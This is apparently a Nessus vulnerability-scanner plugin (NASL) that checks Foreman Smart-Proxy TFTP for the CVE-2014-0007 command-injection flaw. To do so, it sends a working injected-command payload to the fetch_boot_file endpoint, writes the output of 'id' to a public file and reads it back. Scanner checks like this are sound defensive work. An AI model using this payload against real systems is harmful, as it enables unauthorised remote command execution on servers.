#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76578);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2014-0007");
  script_bugtraq_id(68117);
  script_osvdb_id(108277);

  script_name(english:"Foreman Smart-Proxy TFTP Remote Command Injection");
  script_summary(english:"Checks the Foreman Smart-Proxy TFTP version.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is running a version of Foreman Smart-Proxy TFTP
that is affected by a remote command injection vulnerability. An
attacker can send a specially crafted URL that results in the
execution of arbitrary commands.");
  script_set_attribute(attribute:"see_also", value:"http://projects.theforeman.org/issues/6086");
  script_set_attribute(attribute:"solution", value:"Update to version 1.4.5 / 1.5.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:theforeman:foreman");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("foreman_smart_proxy_tftp_detect.nbin");
  script_require_keys("installed_sw/Foreman Smart-Proxy TFTP");
  script_require_ports("Services/www", 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app_name = "Foreman Smart-Proxy TFTP";
get_install_count(app_name:app_name, exit_if_zero:TRUE);
port = get_http_port(default:8443);
vuln = FALSE;

# Only 1 install of the server is possible.
install = get_installs(app_name:app_name, port:port);
if (install[0] == IF_NOT_FOUND) audit(AUDIT_WEB_APP_NOT_INST, app_name, port);
install = install[1][0];

path = install['path'];
url = build_url(port:port, qs:path);

file_name = "nessus_" + unixtime() + ".txt";
post_data =
  '--' + bound + '\r\n' +
  'Content-Disposition: form-data; name="scanner"\r\n' +
  '\r\n' +
  'Nessus\r\n' +
  '--' + bound + '--';
bound = "_bound_nessus_" + unixtime();

headers = make_array(
  "Content-type", "multipart/form-data; boundary=" + bound,
  "Accept", "application/json"
);

exp_req =
  "/fetch_boot_file?prefix=a&path=%3Becho%20%60id%3Bpwd%60%20%3E%20public%2F" +
  file_name +
  "%3Becho";

cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

res = http_send_recv3(
  method: "POST",
  item: url + exp_req,
  data: post_data,
  add_headers: headers,
  port: port,
  exit_on_fail: TRUE
);

sleep(1);

verify_url = url - "tftp" + file_name;

res = http_send_recv3(
  method: "GET",
  item: verify_url,
  port: port,
  exit_on_fail: TRUE
);
output = res[2];

if (egrep(pattern:cmd_pat, string:output))
{
  vuln = TRUE;
  get_up_path = "/";

  get_path = strstr(output, "/");
  get_up_path = chomp(get_path) + "/public/";
  if (!isnull(strstr(output, "uid")))
    output = strstr(output, "uid") - get_path;
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\n' + 'Nessus was able to verify the issue exists using the following request :' +
    '\n' +
    '\n' + verify_url +
    '\n' +
    '\n' + 'Note: This file has not been removed by Nessus, and will need to be' +
    '\n' + 'manually deleted (' + get_up_path + file_name + ').' +
    '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\n' + 'This file was created using a POST request to : ' +
      '\n' + url + exp_req +
      '\n' +
      '\n' + 'To test the issue, Nessus had ' + app_name + ' execute the command "id"' +
      '\n' + 'which produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(extra:report, port:port);
}
else security_hole(port);
